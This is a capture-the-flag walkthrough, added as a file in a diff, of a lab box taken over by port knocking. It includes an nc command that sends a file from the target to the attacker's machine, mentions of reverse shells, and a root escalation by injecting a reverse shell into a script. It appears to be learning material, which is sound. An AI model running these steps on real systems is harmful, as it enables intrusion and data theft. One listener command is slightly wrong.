@@ -1,0 +1,74 @@
+NOTE :-
+
+What is Port Knocking?
+
+Port knocking is a technique that is used to add/remove rules from a firewall when certain Ports are connected/triggered (normally a packet with a SYN flag set) in a set order.
+
+Programs such as Knockd can be used to achieve this.
+
+In this CTF box, if we ‘knock’ on ports 1111, 2222, 3333, 4444 in the right order then the Knockd program on the machine will add/remove a rule to the firewall, most likely opening a new port for us. Normally, you knock once to open, do what you need, then knock again to close the port(s).
+
+In the real world, we wouldn’t find a list of Magic Numbers, however if you suspect Port Knocking is in use then you might be able to use a tool such as Wireshark and see if there are any patterns occurring. Such as, you always see ports 1245, 1689, 4788 being connected to, though the connections don’t last.
+Port Knocking
+
+The magic numbers are not in the right order, at least not for me. So we can brute force the order, and then rescan the server and hope for a new port to open up.
+
+I found a python script named KnockIt which can be used for brute forcing. Remember, if the script works for you, leave a star on github.
+https://github.com/eliemoutran/KnockIt
+
+The code below is what I used to run the script, you likely need to change the absolute path or update you PATH variable to run the script globally, or just put the script somewhere that is already in the PATH variable.
+
+python3 ~/Documents/scripts/KnockIt/knockit.py -b <IP> 1111 2222 3333 4444
+
+Once the brute force attack is done, we can redo an nmap scan and see if there are any new ports.
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
+step 1:-
+here open ports 21,22,8080 and 21 is filltered.
+than i goto web on port 8080 and show the 
+“POST ALL YOUR CAT PICTURES HERE :)
+
+Knock knock! Magic numbers: 1111, 2222, 3333, 4444"
+
+The “Knock Knock” is referring to a technique known as Port Knocking, which is a form of network hardening, though most people don’t hold it in high regard it seems.
+
+it will down the fire wall than i re scan with nmap here i show the some ports are open.
+than i go to ftp server and open the txt file this says
+
+cat note.txt      
+In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
+
+Connect to port 4420, the password is sardinethecat.
+- catlover
+
+that mean some where port 4420 are open so using nc i connect.
+
+step 2:-
+nc -nv [ip] 4420
+but here i not uses some cmd like cd,etc..
+so, using ls cmd i find what is i access to run
+ls /usr/bin 
+they says touch, mkfifo, wget
+so using reverse shell i connect terminal to server
+than i show the i have access to run cd,etc... cmd.
+
+i have find file name runme.
+this file is executable file so i uses this
+./runme
+but this need to password for run.
+
+so using cat i open file, here i show nothing so i want to use strings cmd but this terminal don't have so i finnaly think i download on my machine using nc.
+
+step 3:-
+nc 10.17.7.104 5555 < /host/catlover/runme
+i uses these in my target machine that uses for file upload.
+nc -nvlp 5555 < runme
+i uses in my machine terminal that uses for doenload file.
+than using string i open runme file that give me runme file password
+than i run password that file give me ssh id_rsa key.
+
+step 4:-
+using this key i enter in ssh server.
+i need to escalate my privileges so i here open bash.history for show histoty of uses cmd.
+i find one file that uses bash script so i enter reverse bash in the file and using nc i connect shell as a root.
